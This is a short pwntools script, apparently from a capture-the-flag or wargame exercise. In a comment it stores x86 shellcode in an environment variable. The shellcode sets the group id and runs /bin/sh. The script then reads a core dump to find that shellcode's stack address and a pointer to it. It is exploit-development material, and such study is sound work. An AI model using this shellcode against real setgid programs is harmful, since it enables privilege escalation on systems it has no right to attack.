#!/usr/bin/env python

from pwn import *

# export A=$(python -c "print('\xb82\x00\x00\x00\xcd\x80\x89\xc3\x89\xc1\xb8G\x00\x00\x00\xcd\x80j\x00hn/shh//bi\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80')")

c = Core('core')

print(c.registers)

A = c.getenv('A')

gdb.debug_shellcode(A)

addr = c.stack.find(A)

stack_addr = c.stack.find(p32(addr))

print(A)
print(hex(addr))
print(hex(stack_addr))
